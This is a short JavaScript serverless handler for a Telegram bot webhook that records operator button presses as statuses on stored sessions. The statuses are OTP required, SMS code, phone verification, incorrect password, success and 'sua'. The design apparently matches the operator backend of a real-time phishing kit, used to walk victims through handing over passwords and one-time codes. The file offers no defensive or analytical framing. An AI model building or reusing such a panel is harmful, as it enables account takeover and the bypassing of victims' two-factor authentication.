import { dbUpdate } from './_supabase.js';

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;

const COMMAND_MAP = {
  otp:       'otp_required',
  sms:       'sms_code',
  phone:     'phone_verification',
  success:   'success',
  incorrect: 'incorrect_password',
  sua:       'sua',
};

export const handler = async (event) => {
  if (event.httpMethod !== 'POST') return { statusCode: 200, body: 'ok' };

  try {
    const update = JSON.parse(event.body || '{}');

    if (update.callback_query) {
      const cb     = update.callback_query;
      const cbId   = cb.id;
      const cbData = cb.data || '';

      console.log('callback_query:', cbData);

      const match = cbData.match(/^([a-z]+)_([a-f0-9]{32})$/);
      if (!match) { await answerCb(cbId, '⚠️ Invalid format'); return { statusCode: 200, body: 'ok' }; }

      const action       = match[1];
      const sessionId    = match[2];
      const responseType = COMMAND_MAP[action];

      if (!responseType) { await answerCb(cbId, '⚠️ Unknown action'); return { statusCode: 200, body: 'ok' }; }

      await dbUpdate('sessions', {
        status:        'responded',
        response_type: responseType,
        responded_at:  new Date().toISOString(),
        last_update:   new Date().toISOString(),
      }, { id: sessionId });

      console.log(`Session ${sessionId} → ${responseType}`);
      await answerCb(cbId, `✅ ${action.charAt(0).toUpperCase() + action.slice(1)} triggered!`);
    }
  } catch (e) {
    console.error('bot-webhook error:', e.message);
  }

  return { statusCode: 200, body: 'ok' };
};

async function answerCb(cbId, text) {
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: cbId, text }),
      signal: AbortSignal.timeout(5000),
    });
  } catch (e) { console.error('answerCb error:', e.message); }
}
